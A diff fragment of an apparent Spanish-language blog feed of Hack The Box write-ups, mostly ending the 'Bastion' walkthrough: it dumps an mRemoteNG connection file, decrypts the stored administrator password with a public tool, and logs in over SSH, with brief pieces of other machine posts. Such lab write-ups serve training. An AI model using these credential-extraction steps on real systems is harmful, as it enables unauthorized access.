class=&quot;nv&quot;&gt;UseCredSsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt; Rendering
+&lt;span class=&quot;nv&quot;&gt;Engine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IE&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ICAEncryptionStrength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;EncrBasic&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDPAuthenticationLevel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;NoAuth&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDPMinutesToIdleTimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDPAlertIdleTimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f
+alse&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LoadBalanceInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Colors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Colors16Bit&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Resolution&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;FitToWindow&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AutomaticResize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DisplayWallpaper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; DisplayTh
+&lt;span class=&quot;nv&quot;&gt;emes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;EnableFontSmoothing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;EnableDesktopComposition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CacheBitmaps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RedirectDiskDrives&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; Redire
+&lt;span class=&quot;nv&quot;&gt;ctPorts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RedirectPrinters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RedirectSmartCards&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RedirectSound&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DoNotPlay&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;SoundQuality&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Dynamic&quot;&lt;/span&gt; RedirectKey
+&lt;span class=&quot;nv&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Connected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PreExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PostExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MacAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UserField&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCCompression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CompNone&quot;&lt;/span&gt; VNCEncodin
+&lt;span class=&quot;nv&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;EncHextile&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCAuthMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AuthVNC&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCProxyType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ProxyNone&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCProxyIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCProxyPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCProxyUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; VNCProxyPasswor
+&lt;span class=&quot;nv&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCColors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ColNormal&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCSmartSizeMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SmartSAspect&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCViewOnly&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayUsageMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Never&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayHostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;RDGatewayUseConnectionCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Yes&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayDomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritCacheBitmaps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false
+&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritColors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritDescription&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritDisplayThemes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritDisplayWallpaper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritEnableFon
+&lt;span class=&quot;nv&quot;&gt;tSmoothing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritEnableDesktopComposition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritDomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritIcon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPanel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; Inheri
+&lt;span class=&quot;nv&quot;&gt;tPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritProtocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPuttySession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRedirectDiskDrives&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; Inhe
+&lt;span class=&quot;nv&quot;&gt;ritRedirectKeys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRedirectPorts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRedirectPrinters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRedirectSmartCards&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritRe
+&lt;span class=&quot;nv&quot;&gt;directSound&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritSoundQuality&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritResolution&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritAutomaticResize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritUseConsoleSessio
+&lt;span class=&quot;nv&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritUseCredSsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRenderingEngine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritICAEncryptionStrength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;InheritRDPAuthenticationLevel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDPMinutesToIdleTimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDPAlertIdleTimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritLoadBalan
+&lt;span class=&quot;nv&quot;&gt;ceInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPreExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPostExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritMacAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritUserField&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritExtA
+&lt;span class=&quot;nv&quot;&gt;pp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCCompression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCEncoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCAuthMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCProxyType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; Inher
+&lt;span class=&quot;nv&quot;&gt;itVNCProxyIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCProxyPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCProxyUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCProxyPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritVNCColor
+&lt;span class=&quot;nv&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCSmartSizeMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCViewOnly&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayUsageMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritRDGatewayHostnam
+&lt;span class=&quot;nv&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayUseConnectionCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; Inh
+&lt;span class=&quot;nv&quot;&gt;eritRDGatewayDomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; /&amp;gt;                                                                                                  
+&amp;lt;/mrng:Connections&amp;gt;                                                                                                             
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;oaming&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;RemoteNG&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro de dicho archivo vemos la contraseña del usuario &lt;strong&gt;administrator&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;Id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora, nos descargamos la siguiente utilidad que nos ayudará a descifrar la contraseña:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ git clone https://github.com/haseebT/mRemoteNG-Decrypt
+Clonando en &lt;span class=&quot;s1&quot;&gt;'mRemoteNG-Decrypt'&lt;/span&gt;...
+remote: Enumerating objects: 19, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Total 19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 19
+Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;19/19&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 14.80 KiB | 14.80 MiB/s, listo.
+Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4/4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y la ejecutamos de acuerdo nos indica el propietario:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 mremoteng_decrypt.py &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+Password: thXLHM96BeKL0ER2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos la contraseña del usuario &lt;strong&gt;administrator&lt;/strong&gt;; así que podríamos tratar de ingresar vía ssh a la máquina:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh administrator@10.10.10.134
+administrator@10.10.10.134&lt;span class=&quot;s1&quot;&gt;'s password:
+Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@BASTION C:\Users\Administrator&amp;gt;whoami                                                                             
+bastion\administrator                                                                                                           
+
+administrator@BASTION C:\Users\Administrator&amp;gt; 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Powershell" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Bastion en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Blocky</title><link href="http://localhost:4000/htb-blocky/" rel="alternate" type="text/html" title="Hack The Box Blocky" /><published>2022-03-18T00:00:00-06:00</published><updated>2022-03-18T00:00:00-06:00</updated><id>http://localhost:4000/htb-blocky</id><content type="html" xml:base="http://localhost:4000/htb-blocky/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-blocky/banner-blocky.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;blocky&quot;&gt;Blocky&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.37.&lt;/p&gt;
@@ -3731,356 +4332,4 @@ root@swagshop:/var/www/html# &lt;span class=&quot;nb&quot;&gt;whoami
 root@swagshop:/var/www/html#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="SQL" /><category term="SQLi" /><summary type="html">Resolución de la máquina SwagShop en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Netmon</title><link href="http://localhost:4000/htb-netmon/" rel="alternate" type="text/html" title="Hack The Box Netmon" /><published>2022-02-06T00:00:00-06:00</published><updated>2022-02-06T00:00:00-06:00</updated><id>http://localhost:4000/htb-netmon</id><content type="html" xml:base="http://localhost:4000/htb-netmon/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/banner-netmon.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;netmon&quot;&gt;Netmon&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.152.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.152
